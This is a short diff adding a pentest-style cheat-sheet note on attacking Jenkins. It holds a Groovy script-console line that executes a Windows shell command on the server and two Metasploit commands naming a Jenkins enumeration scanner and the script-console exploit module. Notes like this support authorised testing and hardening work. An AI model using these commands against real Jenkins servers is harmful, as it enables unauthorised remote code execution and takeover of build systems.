@@ -1,0 +1,5 @@
+Jekins Console
+println "cmd.exe /c dir".execute().text
+
+msf >use auxiliary/scanner/http/jenkins_enum
+msf >use exploit/multi/http/jenkins_script_console
